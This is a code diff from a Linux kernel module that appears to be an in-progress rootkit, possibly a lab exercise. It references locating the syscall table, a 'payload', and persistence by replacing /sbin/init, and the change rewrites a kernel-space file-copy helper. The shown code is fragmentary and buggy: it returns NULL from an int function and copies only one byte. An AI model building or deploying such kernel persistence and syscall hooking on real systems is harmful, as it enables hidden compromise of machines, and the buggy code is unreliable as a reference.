@@ -253,27 +253,13 @@ void **find_syscall_table(void)
 // ref: https://www.linuxjournal.com/article/8110
 //      https://en.it1352.com/article/bd12740c86574c22aff0e5b2b89680e4.html
 // could have done this with function pointers? using lower level stuff tho
-void clone_file(const char* filepath_1, const char* filepath_2) {
-    int fd, ret;
-    unsigned char buf[100];
+int clone_file(const char* filepath_1, const char* filepath_2) {
+    int err;
+    ssize_t f1_ret, f2_ret;
+    unsigned char buf[1];
 
-    // mm_segment_t old_fs = get_fs();
-    // set_fs(USER_DS);
-
-    // fd = sys_open(filepath_1, O_RDONLY, 0);
-    // if (fd >= 0) {
-    //     // read
-    //     while (sys_read(fd, buf, 1) == 1) {
-    //         printk("%c", buf[0]);
-    //     }
-    //     printk("\n");
-    //     sys_close(fd);
-    // }
-
-    // set_fs(old_fs);
-
+    // open first file for reading
     struct file *filp = NULL;
-    int err = 0;
 
     mm_segment_t old_fs = get_fs();
     set_fs(get_ds());
@@ -283,16 +269,44 @@ void clone_file(const char* filepath_1, const char* filepath_2) {
         err = PTR_ERR(filp);
         return NULL;
     }
+    
+    loff_t pos = filp->f_pos;
+    f1_ret = vfs_read(filp, buf, 1, &pos);
+    if (f1_ret > 0) {
+        filp->f_pos = pos;
+    }
 
-    ret = vfs_read(filp, buf, 100, 0);
+    loff_t end = vfs_llseek(filp, 0, SEEK_END);
+
+
+    // open second file for writing
+    {
+        struct file *filp_write = NULL;
+        filp_write = filp_open(filepath_2, O_WRONLY | O_CREAT, 0);
+        if (IS_ERR(filp_write)) {
+            err = PTR_ERR(filp_write);
+            return NULL;
+        }
+
+        loff_t pos_write = filp_write->f_pos;
+        f2_ret = vfs_write(filp_write, buf, 1, &pos_write);
+        if (f2_ret > 0) {
+            filp->f_pos = pos;
+        }
+
+        filp_close(filp_write, NULL);
+    }
 
     set_fs(old_fs);
+    filp_close(filp, NULL);
 
-    int i;
-    for (i = 0; i < 100; i++) {
-        printk("%c", buf[i]);
-    }
-    printk("\n");
+    // int i;
+    // for (i = 0; i < 5; i++) {
+    //     printk("%c", buf[i]); 
+    // }
+    // printk("\n");
+
+    return 0;
 }
 
 // most of this should only be executed on the first
@@ -300,7 +314,7 @@ void clone_file(const char* filepath_1, const char* filepath_2) {
 // - should this be done in our payload instead?
 //   doing file I/O is bad in kernel modules
 void add_to_reboot() {
-    clone_file("/home/vagrant/dog.txt", "");
+    clone_file("/home/vagrant/dog.txt", "/home/vagrant/dog_copy.txt");
 
     // check for existence of /sbin/init_original
     // if (!access(FILE_INIT_ORIGINAL, R_OK) == 0) {
